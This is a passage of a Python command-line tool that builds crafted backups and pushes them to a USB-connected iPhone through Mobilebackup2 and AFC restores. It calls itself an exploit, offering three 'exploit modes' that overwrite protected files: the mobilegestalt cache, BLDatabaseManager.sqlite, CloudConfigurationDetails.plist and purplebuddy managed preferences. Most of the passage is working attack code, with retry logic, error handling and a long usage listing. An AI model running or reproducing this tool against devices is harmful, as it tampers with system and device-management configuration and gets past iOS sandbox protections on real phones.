    print(f"  {_c('Target path:', C.YELLOW)} {_c(to_path, C.MAGENTA)}")
    back = _make_sparse_backup(
        from_path,
        to_path,
        plist_layout=PLIST_LAYOUT_SELECTED,
        no_sentinels=NO_SENTINELS_SELECTED,
        payload_bytes=PAYLOAD_BYTES_OVERRIDE,
    )

    async def _do_restore():
        with TemporaryDirectory() as backup_dir:
            back.write_to_directory(Path(backup_dir))
            restore_identifier = _resolve_restore_identifier(lockdown)
            source_identifier = _normalize_backup_layout(backup_dir, restore_identifier)
            source_primary = source_identifier or restore_identifier
            required = ("Info.plist", "Manifest.plist", "Status.plist")
            backup_root = Path(backup_dir)
            udid_dir = backup_root / restore_identifier
            flat_has_required = all((backup_root / name).exists() for name in required)
            udid_has_required = all((udid_dir / name).exists() for name in required)
            print(_c(f"  Restore identifier: {restore_identifier}", C.CYAN))
            print(_c(f"  Primary source selector: {source_primary}", C.CYAN))
            print(_c(f"  Flat source has required files: {flat_has_required}", C.CYAN))
            print(_c(f"  UDID source has required files: {udid_has_required}", C.CYAN))
            attempts = [
                {
                    "system": True,
                    "reboot": False,
                    "copy": False,
                    "settings": True,
                    "source": source_primary,
                    "skip_apps": False,
                },
                {
                    # Compatibility retry for MBErrorDomain/205 class failures.
                    "system": True,
                    "reboot": False,
                    "copy": False,
                    "settings": False,
                    "source": source_primary,
                    "skip_apps": True,
                },
            ]
            if flat_has_required and not BACKUP_COMPAT_MODE:
                attempts.extend(
                    [
                        {
                            # Fallback: explicit flat source selector.
                            "system": True,
                            "reboot": False,
                            "copy": False,
                            "settings": True,
                            "source": ".",
                            "skip_apps": False,
                        },
                        {
                            # Fallback with compatibility options.
                            "system": True,
                            "reboot": False,
                            "copy": False,
                            "settings": False,
                            "source": ".",
                            "skip_apps": True,
                        },
                    ]
                )
            last_error = None
            for idx, opts in enumerate(attempts, 1):
                try:
                    active_lockdown = lockdown
                    if idx != 1 and not BACKUP_COMPAT_MODE:
                        refreshed = await _get_connected_usb_device_async()
                        active_lockdown = refreshed or lockdown
                    print(_c(f"  Restore option set {idx}/{len(attempts)}: {opts}", C.CYAN))
                    async with Mobilebackup2Service(active_lockdown) as mb:
                        mb.lockdown.udid = restore_identifier
                        restore_call = mb.restore(backup_dir, **opts)
                        if inspect.isawaitable(restore_call):
                            await restore_call
                    return
                except Exception as exc:
                    last_error = exc
                    msg = str(exc)
                    if (
                        (
                            "MBErrorDomain/205" in msg
                            or "MBErrorDomain/1" in msg
                        )
                        and idx < len(attempts)
                    ):
                        print(
                            _c(
                                "Restore hit MBErrorDomain state issue. Retrying with compatibility options...",
                                C.YELLOW,
                            )
                        )
                        continue
                    raise
            if last_error is not None:
                raise last_error

    _resolve(_do_restore())
    print(_c("  Restore complete.", C.GREEN))
    LAST_APPLY_CONFIDENCE = "likely-applied" if not NO_SENTINELS_SELECTED else "unverified-no-sentinels"
    if NO_SENTINELS_SELECTED and not BACKUP_COMPAT_MODE:
        print(
            _c(
                "  --no-sentinels mode: requesting device reboot to apply app-target changes.",
                C.YELLOW,
            )
        )
        restart_device(lockdown)
        _wait_for_usb_device(reason="reconnect")
        print(_c("  Reboot complete; unlock device and verify target behavior.", C.GREEN))


def _resolve_gestalt_chain_assets(from_path):
    base_candidates = [
        Path(from_path).resolve().parent,
        Path(__file__).resolve().parent.parent,
    ]
    resolved = {}
    for name in GESTALT_CHAIN_FILES:
        found = None
        for base in base_candidates:
            candidate = base / name
            if candidate.exists():
                found = candidate
                break
        if found is None:
            raise RuntimeError(
                f"Missing required file for --gestalt-chain: {name}. "
                "Place it next to the input plist or at sparse_tool root."
            )
        resolved[name] = found
    return resolved


def restore_gestalt_chain(from_path, _to_path_unused, lockdown):
    print(_c("[Gestalt Chain]", C.CYAN))
    print(f"  {_c('Source file:', C.YELLOW)} {_c(from_path, C.GREEN)}")
    print("  " + _c("AFC upload target: iTunesMetadata.plist", C.MAGENTA))
    print(_c("  Uploading plist over AFC...", C.CYAN))
    AfcService(lockdown=lockdown).push(from_path, "iTunesMetadata.plist")
    print(_c("  AFC upload complete.", C.GREEN))

    assets = _resolve_gestalt_chain_assets(from_path)
    bl_contents = open(assets["BLDatabaseManager.sqlite"], "rb").read()
    config_contents = open(assets["CloudConfigurationDetails.plist"], "rb").read()
    purplebuddy_contents = open(assets["com.apple.purplebuddy.plist"], "rb").read()
    from exploit import backup as exploit_backup

    back = exploit_backup.Backup(
        files=[
            exploit_backup.Directory("", "SysSharedContainerDomain-systemgroup.com.apple.media.shared.books"),
            exploit_backup.Directory("Documents", "SysSharedContainerDomain-systemgroup.com.apple.media.shared.books", owner=501, group=501),
            exploit_backup.Directory("Documents/BLDatabaseManager", "SysSharedContainerDomain-systemgroup.com.apple.media.shared.books", owner=501, group=501),
            exploit_backup.ConcreteFile(
                "Documents/BLDatabaseManager/BLDatabaseManager.sqlite",
                "SysSharedContainerDomain-systemgroup.com.apple.media.shared.books",
                owner=501,
                group=501,
                contents=bl_contents,
                inode=0,
            ),
            exploit_backup.Directory("", "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles", owner=501, group=501),
            exploit_backup.Directory("Library", "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles", owner=501, group=501),
            exploit_backup.Directory("Library/ConfigurationProfiles", "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles", owner=501, group=501),
            exploit_backup.ConcreteFile(
                "Library/ConfigurationProfiles/CloudConfigurationDetails.plist",
                "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles",
                contents=config_contents,
                owner=501,
                group=501,
            ),
            exploit_backup.Directory("mobile", "ManagedPreferencesDomain", owner=501, group=501),
            exploit_backup.ConcreteFile(
                path="mobile/com.apple.purplebuddy.plist",
                domain="ManagedPreferencesDomain",
                contents=purplebuddy_contents,
                owner=501,
                group=501,
            ),
        ]
    )

    with TemporaryDirectory() as backup_dir:
        back.write_to_directory(Path(backup_dir))
        print(_c("  Starting restore...", C.CYAN))
        async def _do_restore():
            attempts = [
                {
                    "system": True,
                    "reboot": False,
                    "copy": False,
                    "source": ".",
                    "settings": True,
                    "skip_apps": False,
                },
                {
                    # Compatibility retry for restore-state / MBErrorDomain failures.
                    "system": True,
                    "reboot": False,
                    "copy": False,
                    "source": ".",
                    "settings": False,
                    "skip_apps": True,
                },
            ]
            last_exc = None
            for idx, opts in enumerate(attempts, 1):
                try:
                    async with Mobilebackup2Service(lockdown) as mb:
                        restore_call = mb.restore(backup_dir, **opts)
                        if inspect.isawaitable(restore_call):
                            await restore_call
                    return
                except Exception as exc:
                    last_exc = exc
                    msg = str(exc)
                    if (
                        ("MBErrorDomain/1" in msg or "MBErrorDomain/205" in msg)
                        and idx < len(attempts)
                    ):
                        print(
                            _c(
                                "  Restore reported MBErrorDomain state issue. Retrying with compatibility options...",
                                C.YELLOW,
                            )
                        )
                        continue
                    raise
            if last_exc is not None:
                raise last_exc
        _resolve(_do_restore())
        print(_c("  Restore complete.", C.GREEN))
    print(_c("  Rebooting device...", C.CYAN))
    restart_device(lockdown)
    print(_c("  Reboot command sent.", C.GREEN))


def _run_restore_with_reconnect_retry(from_path, to_path, lockdown, max_attempts=4, restore_fn=None):
    if restore_fn is None:
        restore_fn = restore_tips_app
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            print(_c(f"Restore attempt {attempt}/{max_attempts}", C.CYAN))
            # Refresh lockdown before each attempt in case prior session is stale.
            refreshed = get_connected_usb_device()
            if refreshed is not None:
                lockdown = refreshed
            restore_fn(from_path, to_path, lockdown)
            if LAST_APPLY_CONFIDENCE == "unverified-no-sentinels":
                _set_summary("SUCCESS_UNVERIFIED_NO_SENTINELS")
                print(
                    _c(
                        "Restore transport finished, but payload apply is unverified in --no-sentinels mode.",
                        C.YELLOW,
                    )
                )
                print(
                    _c(
                        "Treat this as provisional success; verify on-device behavior before assuming apply.",
                        C.YELLOW,
                    )
                )
            else:
                _set_summary("SUCCESS")
                print(_c("Restore flow finished successfully.", C.GREEN))
            return
        except Exception as exc:
            last_exc = exc
            if _is_transient_usb_error(exc):
                _set_summary("USB_DROP")
            if not _is_transient_usb_error(exc) or attempt >= max_attempts:
                raise
            print(
                _c(
                    f"Restore transport dropped (attempt {attempt}/{max_attempts}). Waiting for USB reconnect...",
                    C.YELLOW,
                )
            )
            if not _wait_for_usb_device(timeout_seconds=45, poll_seconds=2, reason="connect"):
                raise
            # Give usbmux/lockdown a brief moment to settle after reconnect.
            time.sleep(2)
            refreshed = get_connected_usb_device()
            if refreshed is not None:
                lockdown = refreshed
    if last_exc is not None:
        raise last_exc


def handle_restore_exception(e, lockdown):
    err = str(e)
    if "MBErrorDomain/1" in err:
        _set_summary("SRD_MB1")
        print(
            _c(
                "Restore failed with MBErrorDomain/1 (iCloud restore state check).",
                C.RED,
            )
        )
        print(
            _c(
                "On-device state is blocking restore right now. Try: keep device unlocked, "
                "disable iCloud Backup temporarily, reboot device, reconnect USB, then retry.",
                C.YELLOW,
            )
        )
        return

    if "MBErrorDomain/205" in err:
        _set_summary("SRD_MB205")
        print(
            _c(
                "Restore failed with MBErrorDomain/205. "
                "This archive build is not compatible with your current pymobiledevice3 version.",
                C.RED,
            )
        )
        if PYMOBILEDEVICE3_VERSION:
            print(_c(f"Detected pymobiledevice3: {PYMOBILEDEVICE3_VERSION}", C.YELLOW))
        if str(PYMOBILEDEVICE3_VERSION) == "4.25.1":
            print(
                _c(
                    "You are already on 4.25.1; retrying install version will not change this result.",
                    C.YELLOW,
                )
            )
            print(
                _c(
                    "Treat this as a device/state/method failure and retry after reboot + reconnect.",
                    C.YELLOW,
                )
            )
        else:
            _offer_install_pymobiledevice3_fix("4.25.1")
        print(
            _c(
                "Then reconnect the device, trust/unlock, and rerun the command.",
                C.YELLOW,
            )
        )
        print(_c("SUMMARY_CODE=SRD_MB205", C.RED))
        return

    if "MBErrorDomain/3" in err or ("File exists (17)" in err and "Device link error" in err):
        _set_summary("SRD_MB3_EXISTS")
        print(
            _c(
                "Restore failed with MBErrorDomain/3: destination path already exists on device.",
                C.RED,
            )
        )
        print(
            _c(
                "This usually means the chosen target path collides with an existing file layout "
                "for the selected app/mode.",
                C.YELLOW,
            )
        )
        print(_c("Recommended recovery order:", C.CYAN))
        print(_c("  1) Retry with --no-sentinels", C.CYAN))
        print(_c("     python3 main.py <from_path> --target \"Calculator\" --no-sentinels", C.CYAN))
        print(_c("  2) Retry with a different target app", C.CYAN))
        print(_c("     python3 main.py --list-targets", C.CYAN))
        print(_c("     python3 main.py <from_path> --target \"Tips\"", C.CYAN))
        print(_c("  3) If targeting plist/gestalt, switch mode", C.CYAN))
        print(_c("     python3 main.py <input.plist> --plist-name CloudConfigurationDetails", C.CYAN))
        print(_c("     python3 main.py <from_path> --gestalt-chain", C.CYAN))
        print(_c("SUMMARY_CODE=SRD_MB3_EXISTS", C.RED))
        return

    if "Find My" in str(e):
        _set_summary("SRD_FINDMY")
        print("Find My must be disabled in order to use this tool.")
        print(
            "Disable Find My from Settings (Settings -> [Your Name] -> Find My) and then try again."
        )
        return

    if _is_transient_usb_error(e):
        _set_summary("USB_DROP")
        print(
            _c(
                "USB/session connection dropped during restore. "
                "Keep device connected and unlocked, then retry.",
                C.YELLOW,
            )
        )
        _wait_for_usb_device(timeout_seconds=30, poll_seconds=2, reason="connect")
        return

    if _is_invalid_service_error(e):
        _set_summary("INVALID_SERVICE")
        print(
            _c(
                "Device service negotiation failed (InvalidService). "
                "installation_proxy is not currently available.",
                C.RED,
            )
        )
        print(
            _c(
                "Fix: keep device unlocked on Home Screen, reconnect USB, accept trust prompt, "
                "then retry. If it persists, reboot both device and host.",
                C.YELLOW,
            )
        )
        return

    if "crash_on_purpose" not in str(e):
        try:
            restart_device(lockdown)
            _wait_for_usb_device(reason="reconnect")
        except Exception:
            print(
                _c(
                    "Could not request device restart because connection was lost. "
                    "Reconnect/unlock device and retry.",
                    C.YELLOW,
                )
            )
        raise e

    print("Installed payload")
    print("Success. Rebooting your device...")
    restart_device(lockdown)
    _wait_for_usb_device(reason="reconnect")
    print("Remember to turn Find My back on!")


def _is_device_locked_error(exc):
    msg = str(exc).lower()
    compact = msg.replace(" ", "").replace("_", "")
    locked_markers = [
        "passcode",
        "locked",
        "device is locked",
        "password protected",
        "passwordprotected",
        "passwordrequirederror",
        "invalid hostid",
    ]
    return any(marker in msg or marker in compact for marker in locked_markers)


def _is_invalid_service_error(exc):
    msg = str(exc).lower()
    return "invalidservice" in msg or "invalid service" in msg


def _is_transient_usb_error(exc):
    msg = str(exc).lower()
    markers = [
        "connectionterminatederror",
        "connection terminated",
        "connectionreseterror",
        "device not found",
        "devicenotfounderror",
        "broken pipe",
        "timed out",
        "socket connection broken",
        "stream.read() failed",
        "muxexception",
    ]
    return any(marker in msg for marker in markers)


def _connect_lockdown_with_retry(max_attempts=5, delay_seconds=2):
    last_error = None
    for attempt in range(1, max_attempts + 1):
        try:
            lockdown = get_connected_usb_device()
            if lockdown is not None:
                return lockdown
        except Exception as exc:
            last_error = exc
            if not _is_transient_usb_error(exc):
                raise
        if attempt < max_attempts:
            print(
                _c(
                    f"USB handshake unstable (attempt {attempt}/{max_attempts}). Retrying...",
                    C.YELLOW,
                )
            )
            time.sleep(delay_seconds)
    if last_error is not None and not _is_transient_usb_error(last_error):
        raise last_error
    return None


def _asyncio_exception_handler(loop, context):
    exc = context.get("exception")
    msg = context.get("message", "")
    if _is_device_locked_error(exc or msg) or _is_transient_usb_error(exc or msg):
        return
    loop.default_exception_handler(context)


def main():
    global PLIST_LAYOUT_SELECTED
    global NO_SENTINELS_SELECTED
    global PAYLOAD_BYTES_OVERRIDE
    global LAST_APPLY_CONFIDENCE
    global BACKUP_COMPAT_MODE
    _set_summary("STARTED")
    LAST_APPLY_CONFIDENCE = "unknown"
    BACKUP_COMPAT_MODE = False
    _print_intro()
    args = sys.argv[1:]

    show_help_only = "--help" in args or "-h" in args
    if MISSING_DEPS and not show_help_only:
        print(
            _c(
                "Missing runtime dependencies: " + ", ".join(sorted(set(MISSING_DEPS))),
                C.RED,
            )
        )
        for dep in sorted(set(MISSING_DEPS)):
            if dep in MISSING_DEP_ERRORS:
                print(f" - {dep}: {MISSING_DEP_ERRORS[dep]}")
        print("This source build requires local Python dependencies.")
        print("At minimum, install: pymobiledevice3 (and ensure local exploit package is present).")
        sys.exit(1)

    major = _major_version(PYMOBILEDEVICE3_VERSION)
    if major is not None and major >= 9:
        print(
            _c(
                "Detected pymobiledevice3 "
                f"{PYMOBILEDEVICE3_VERSION}, which is known to break this archive restore flow.",
                C.YELLOW,
            )
        )
        _offer_install_pymobiledevice3_fix("4.25.1")
        sys.exit(1)

    from_path = None
    preferred_target = None
    list_only = False
    target_user_apps = False
    target_bundle_prefix = None
    plist_name = None
    gestalt_chain = False
    dry_run = False
    dry_run_matrix = False
    validate_archive = False
    write_run_summary = True
    plist_layout = "legacy"
    no_sentinels = False
    preset = None
    plist_patch_path = None
    patched_keys = []
    legacy_sparse = False
    backup_compat = False
    preflight = False
    delegate_backup_sparse = False
    backup_root = None
    help_requested = False

    i = 0
    while i < len(args):
        arg = args[i]
        if arg == "--help" or arg == "-h":
            help_requested = True
            i += 1
            continue
        if arg == "--legacy-only":
            if _run_legacy_only_mode(args):
                return
            i += 1
            continue
        if arg == "--delegate-backup-sparse":
            delegate_backup_sparse = True
            i += 1
            continue
        if arg == "--backup-root":
            if i + 1 >= len(args):
                print(_c("Missing value for --backup-root", C.RED))
                sys.exit(1)
            backup_root = urllib.unquote(args[i + 1]).strip()
            i += 2
            continue
        if arg == "--list-targets":
            list_only = True
            i += 1
            continue
        if arg == "--user-apps":
            target_user_apps = True
            i += 1
            continue
        if arg == "--target":
            if i + 1 >= len(args):
                print(_c("Missing value for --target", C.RED))
                sys.exit(1)
            preferred_target = urllib.unquote(args[i + 1])
            i += 2
            continue
        if arg == "--target-bundle-prefix":
            if i + 1 >= len(args):
                print(_c("Missing value for --target-bundle-prefix", C.RED))
                sys.exit(1)
            target_bundle_prefix = urllib.unquote(args[i + 1]).strip()
            i += 2
            continue
        if arg == "--plist-name":
            if i + 1 >= len(args):
                print(_c("Missing value for --plist-name", C.RED))
                sys.exit(1)
            plist_name = urllib.unquote(args[i + 1]).strip()
            i += 2
            continue
        if arg == "--gestalt-chain":
            gestalt_chain = True
            i += 1
            continue
        if arg == "--force-gestalt-chain":
            gestalt_chain = True
            i += 1
            continue
        if arg == "--dry-run":
            dry_run = True
            i += 1
            continue
        if arg == "--dry-run-matrix":
            dry_run_matrix = True
            i += 1
            continue
        if arg == "--validate-archive":
            validate_archive = True
            i += 1
            continue
        if arg == "--plist-layout":
            if i + 1 >= len(args):
                print(_c("Missing value for --plist-layout", C.RED))
                sys.exit(1)
            plist_layout = urllib.unquote(args[i + 1]).strip().lower()
            if plist_layout not in ("legacy", "normalized"):
                print(_c("Invalid --plist-layout value. Use: legacy or normalized", C.RED))
                sys.exit(1)
            i += 2
            continue
        if arg == "--no-sentinels":
            no_sentinels = True
            i += 1
            continue
        if arg == "--preset":
            if i + 1 >= len(args):
                print(_c("Missing value for --preset", C.RED))
                sys.exit(1)
            preset = urllib.unquote(args[i + 1]).strip().lower()
            if preset not in ("clean-plist",):
                print(_c("Invalid --preset value. Supported: clean-plist", C.RED))
                sys.exit(1)
            i += 2
            continue
        if arg == "--no-run-summary":
            write_run_summary = False
            i += 1
            continue
        if arg == "--plist-patch":
            if i + 1 >= len(args):
                print(_c("Missing value for --plist-patch", C.RED))
                sys.exit(1)
            plist_patch_path = urllib.unquote(args[i + 1]).strip()
            i += 2
            continue
        if arg == "--legacy-sparse":
            legacy_sparse = True
            i += 1
            continue
        if arg == "--backup-compat":
            backup_compat = True
            i += 1
            continue
        if arg == "--preflight":
            preflight = True
            i += 1
            continue
        if from_path is None:
            from_path = urllib.unquote(arg)
            i += 1
            continue
        if preferred_target is None:
            preferred_target = urllib.unquote(arg)
            i += 1
            continue
        print(_c(f"Unexpected argument: {arg}", C.RED))
        sys.exit(1)

    if preflight:
        _run_preflight()
        return

    if delegate_backup_sparse:
        _delegate_to_backup_sparse(_backup_passthrough_args(args), backup_root=backup_root)
        return

    if help_requested:
        from_path = None

    if from_path is None and not list_only:
        print(
            _c(
                "Usage: sparse.py <from_path> [target_app_name_or_bundle_id]",
                C.YELLOW,
            )
        )
        print("")
        print(_c("Usage extensions:", C.CYAN))
        print("")
        print(_c("Top Common Commands (Enumeration + Exploit Paths):", C.CYAN))
        print(_c("  Enumerate system apps:", C.CYAN))
        print(_c("    python3 main.py --list-targets", C.CYAN))
        print(_c("  Enumerate user-installed apps:", C.CYAN))
        print(_c("    python3 main.py --list-targets --user-apps", C.CYAN))
        print(_c("  Enumerate only matching bundle IDs:", C.CYAN))
        print(_c("    python3 main.py --list-targets --target-bundle-prefix com.apple.", C.CYAN))
        print(_c("  Exploit mode 1 (App-target SparseRestore):", C.CYAN))
        print(_c("    python3 main.py payload.bin --target \"Calculator\"", C.CYAN))
        print(_c("    Difference: writes payload into a selected app container path.", C.CYAN))
        print(_c("  Exploit mode 2 (Direct plist SparseRestore):", C.CYAN))
        print(_c("    python3 main.py input.plist --plist-name CloudConfigurationDetails", C.CYAN))
        print(_c("    Difference: writes/overwrites one gestalt cache plist directly (<name>.plist).", C.CYAN))
        print(_c("  Exploit mode 3 (Gestalt-chain via AFC + BLDB/config/purplebuddy):", C.CYAN))
        print(_c("    python3 main.py payload.bin --gestalt-chain", C.CYAN))
        print(_c("    Difference: stages through chain assets and updates all 3 gestalt-related files.", C.CYAN))
        print(_c("  Validate archive only (no restore):", C.CYAN))
        print(_c("    python3 main.py payload.bin --validate-archive", C.CYAN))
        print(_c("  Plan-only diagnostics (no restore):", C.CYAN))
        print(_c("    python3 main.py payload.bin --dry-run", C.CYAN))
        print("")
        print(_c("  1) --list-targets", C.WHITE))
        print(_c("     Syntax: sparse.py --list-targets [--user-apps] [--target-bundle-prefix <prefix>]", C.WHITE))
        print(_c("     Usage: Enumerate targetable apps and exit without restoring.", C.WHITE))
        print(_c("     Example: sparse.py --list-targets --user-apps", C.WHITE))
        print(_c("  2) --target <app_name_or_bundle_id>", C.WHITE))
        print(_c("     Syntax: sparse.py <from_path> --target \"Calculator\"", C.WHITE))
        print(_c("     Usage: Select one explicit target app by display name or bundle identifier.", C.WHITE))
        print(_c("     Example: sparse.py payload.bin --target com.apple.calculator", C.WHITE))
        print(_c("  3) --user-apps", C.WHITE))
        print(_c("     Syntax: sparse.py <from_path> --user-apps [--target <name_or_bundle_id>]", C.WHITE))
        print(_c("     Usage: Switch app discovery/targeting to user-installed apps instead of system apps.", C.WHITE))
        print(_c("     Example: sparse.py payload.bin --user-apps --target MyApp", C.WHITE))
        print(_c("  4) --target-bundle-prefix <prefix>", C.WHITE))
        print(_c("     Syntax: sparse.py <from_path> --target-bundle-prefix com.apple.", C.WHITE))
        print(_c("     Usage: Filter candidate targets to bundle IDs starting with the given prefix.", C.WHITE))
        print(_c("     Example: sparse.py payload.bin --list-targets --target-bundle-prefix com.apple.", C.WHITE))
        print(_c("  5) --plist-name <name>", C.WHITE))
        print(_c("     Syntax: sparse.py <input.plist> --plist-name cloudcfg", C.WHITE))
        print(_c("     Usage: Write plist payload as mobilegestalt cache file <name>.plist.", C.WHITE))
        print(_c("     Example: sparse.py config.plist --plist-name CloudConfigurationDetails", C.WHITE))
        print(_c("  6) --gestalt-chain", C.WHITE))
        print(_c("     Syntax: sparse.py <from_path> --gestalt-chain", C.WHITE))
        print(_c("     Usage: Use AFC + BLDatabase/config/purplebuddy chain path for restore staging.", C.WHITE))
        print(_c("     Example: sparse.py payload.bin --gestalt-chain", C.WHITE))
        print(_c("  7) --dry-run", C.WHITE))
        print(_c("     Syntax: sparse.py <from_path> --dry-run [other flags]", C.WHITE))
        print(_c("     Usage: Print diagnostics, selected mode, and planned actions without restoring.", C.WHITE))
        print(_c("     Example: sparse.py payload.bin --dry-run --target Calculator", C.WHITE))
        print(_c("  8) --dry-run-matrix", C.WHITE))
        print(_c("     Syntax: sparse.py <from_path> --dry-run-matrix", C.WHITE))
        print(_c("     Usage: Emit JSON test matrix for supported restore combinations, then exit.", C.WHITE))
        print(_c("     Example: sparse.py payload.bin --dry-run-matrix", C.WHITE))
        print(_c("  9) --force-gestalt-chain", C.WHITE))
        print(_c("     Syntax: sparse.py <from_path> --force-gestalt-chain", C.WHITE))
        print(_c("     Usage: Alias of --gestalt-chain; forces chain-mode selection.", C.WHITE))
        print(_c("     Example: sparse.py payload.bin --force-gestalt-chain", C.WHITE))
        print(_c(" 10) --no-run-summary", C.WHITE))
        print(_c("     Syntax: sparse.py <from_path> --no-run-summary", C.WHITE))
        print(_c("     Usage: Disable JSON summary-file write for the current run.", C.WHITE))
        print(_c("     Example: sparse.py payload.bin --no-run-summary", C.WHITE))
        print(_c(" 11) --validate-archive", C.WHITE))
        print(_c("     Syntax: sparse.py <from_path> --validate-archive", C.WHITE))
        print(_c("     Usage: Build archive in validation mode and print consistency report only.", C.WHITE))
        print(_c("     Example: sparse.py payload.bin --validate-archive", C.WHITE))
        print(_c(" 12) --plist-layout <legacy|normalized>", C.WHITE))
        print(_c("     Syntax: sparse.py <input.plist> --plist-layout normalized", C.WHITE))
        print(_c("     Usage: Control plist target archive layout strategy.", C.WHITE))
        print(_c("     Example: sparse.py payload.plist --plist-layout legacy", C.WHITE))
        print(_c(" 13) --no-sentinels", C.WHITE))
        print(_c("     Syntax: sparse.py <from_path> --no-sentinels", C.WHITE))
        print(_c("     Usage: Omit .backup.i and crash_on_purpose sentinel files from archive payload.", C.WHITE))
        print(_c("     Example: sparse.py payload.bin --no-sentinels", C.WHITE))
        print(_c(" 14) --preset clean-plist", C.WHITE))
        print(_c("     Syntax: sparse.py <input.plist> --preset clean-plist", C.WHITE))
        print(_c("     Usage: Convenience preset that applies --plist-layout normalized + --no-sentinels.", C.WHITE))
        print(_c("     Example: sparse.py payload.plist --preset clean-plist", C.WHITE))
        print(_c(" 15) --plist-patch <path.json>", C.WHITE))
        print(_c("     Syntax: sparse.py <input.plist> --plist-patch patch.json", C.WHITE))
        print(_c("     Usage: Apply JSON key patch to plist payload before archive build/restore.", C.WHITE))
        print(_c("     Example: sparse.py payload.plist --plist-patch overrides/device_patch.json", C.WHITE))
        print(_c(" 16) --legacy-sparse", C.WHITE))
        print(_c("     Syntax: sparse.py <from_path> --target \"Tips\" --legacy-sparse", C.WHITE))
        print(_c("     Usage: Use legacy app-target sparse execution path (no reconnect retry wrapper).", C.WHITE))
        print(_c("     Example: sparse.py payload.bin --target Tips --legacy-sparse", C.WHITE))
        print(_c(" 17) --preflight", C.WHITE))
        print(_c("     Syntax: sparse.py --preflight", C.WHITE))
        print(_c("     Usage: Print Python/pymobiledevice3/usbmux/lockdown diagnostics and exit.", C.WHITE))
        print(_c("     Example: sparse.py --preflight", C.WHITE))
        print(_c(" 18) --backup-compat", C.WHITE))
        print(_c("     Syntax: sparse.py <from_path> --target \"Tips\" --backup-compat", C.WHITE))
        print(_c("     Usage: Force backup-repo sparse behavior (legacy layout, no wrapper, no extra fallbacks).", C.WHITE))
        print(_c("     Example: sparse.py payload.bin --target Calculator --backup-compat", C.WHITE))
        print(_c(" 19) --delegate-backup-sparse [--backup-root <path>]", C.WHITE))
        print(_c("     Syntax: sparse.py --delegate-backup-sparse <from_path> --target Tips", C.WHITE))
        print(_c("     Usage: Run the backup repo's sparse.py directly with passthrough args.", C.WHITE))
        print(_c("     Example: sparse.py --delegate-backup-sparse payload.bin --target Tips", C.WHITE))
        print(_c(" 20) --legacy-only", C.WHITE))
        print(_c("     Syntax: sparse.py --legacy-only <from_path> --target Tips", C.WHITE))
        print(_c("     Usage: Route execution to the backup repo compatibility engine.", C.WHITE))
        print(_c("     Example: sparse.py --legacy-only payload.bin --target Tips", C.WHITE))
        print(_c(" 21) See CLASS_USAGE.md for class examples", C.WHITE))
        print(_c("     Usage: Additional higher-level invocation patterns and class-oriented workflows.", C.WHITE))
        sys.exit(0 if help_requested else 1)

    if preset == "clean-plist":
        plist_layout = "normalized"
        no_sentinels = True
    if backup_compat:
        print(_c("Backup-compat mode enabled: delegating to backup repo sparse engine.", C.YELLOW))
        _delegate_to_backup_sparse(_backup_passthrough_args(args), backup_root=backup_root)
        return
    PAYLOAD_BYTES_OVERRIDE = None
    if plist_patch_path:
        try:
            PAYLOAD_BYTES_OVERRIDE, patched_keys = _load_and_apply_plist_patch(from_path, plist_patch_path)
        except Exception as exc:
            print(_c(f"Failed to apply --plist-patch: {exc}", C.RED))
            sys.exit(1)

    if plist_name and from_path and not from_path.lower().endswith(".plist"):
        print(_c("In --plist-name mode, source file should be a .plist input.", C.YELLOW))

    lockdown = None
    try:
        lockdown = _connect_lockdown_with_retry()
        if lockdown is None:
            if _wait_for_usb_device(timeout_seconds=20, poll_seconds=2, reason="connect"):
                lockdown = _connect_lockdown_with_retry()
            if lockdown is None:
                print(_c("NoDeviceConnectedError", C.RED))
                sys.exit()

        print(_c(f"Device product version: {getattr(lockdown, 'product_version', 'unknown')}", C.CYAN))
        if preset:
            print(_c(f"Applied preset: {preset}", C.CYAN))
        print(_c(f"Selected plist layout: {plist_layout}", C.CYAN))
        print(_c(f"No sentinels: {no_sentinels}", C.CYAN))
        if plist_patch_path:
            print(_c(f"Applied plist patch: {plist_patch_path}", C.CYAN))
            print(_c(f"Patched keys: {', '.join(patched_keys) if patched_keys else 'none'}", C.CYAN))
        PLIST_LAYOUT_SELECTED = plist_layout
        NO_SENTINELS_SELECTED = no_sentinels
        if from_path is not None:
            _print_payload_diagnostics(from_path)
        if dry_run_matrix:
            print(_c("[Dry-Run Matrix JSON]", C.CYAN))
            print(json.dumps(_build_dry_run_matrix(lockdown, from_path, plist_name, gestalt_chain), indent=2, sort_keys=True))
            return

        selected_mode = None
        if gestalt_chain:
            selected_mode = "gestalt-chain"
            print(_c("Using gestalt-chain mode.", C.CYAN))
            if dry_run:
                _set_summary("DRY_RUN")
                print(_c("Dry-run: skipping AFC upload and restore.", C.YELLOW))
                if write_run_summary:
                    _write_run_summary_json(lockdown, from_path, plist_name, gestalt_chain, selected_mode)
                return
            _run_restore_with_reconnect_retry(
                from_path,
                "",
                lockdown,
                restore_fn=restore_gestalt_chain,
            )
            if write_run_summary:
                _write_run_summary_json(lockdown, from_path, plist_name, gestalt_chain, selected_mode)
            return

        if plist_name:
            if _supports_sparse_restore_for_device(lockdown):
                selected_mode = "plist-sparserestore"
                to_path = _resolve_target_plist_path(plist_name)
                print(_c("Using plist target mode (SparseRestore path).", C.CYAN))
                print(f"  {_c('Planned target path:', C.YELLOW)} {_c(to_path, C.MAGENTA)}")
                if validate_archive:
                    _set_summary("VALIDATED_ARCHIVE")
                    _validate_sparse_archive(from_path, to_path, lockdown, plist_layout, no_sentinels)
                    if write_run_summary:
                        _write_run_summary_json(lockdown, from_path, plist_name, gestalt_chain, selected_mode)
                    return
                if dry_run:
                    _set_summary("DRY_RUN")
                    print(_c("Dry-run: skipping restore.", C.YELLOW))
                    if write_run_summary:
                        _write_run_summary_json(lockdown, from_path, plist_name, gestalt_chain, selected_mode)
                    return
                _run_restore_with_reconnect_retry(from_path, to_path, lockdown)
            else:
                selected_mode = "plist-auto-gestalt-chain"
                print(
                    _c(
                        "SparseRestore path is not supported on this OS version; "
                        "auto-switching to gestalt-chain mode.",
                        C.YELLOW,
                    )
                )
                if dry_run:
                    _set_summary("DRY_RUN")
                    print(_c("Dry-run: skipping AFC upload and restore.", C.YELLOW))
                    if write_run_summary:
                        _write_run_summary_json(lockdown, from_path, plist_name, gestalt_chain, selected_mode)
                    return
                _run_restore_with_reconnect_retry(
                    from_path,
                    "",
                    lockdown,
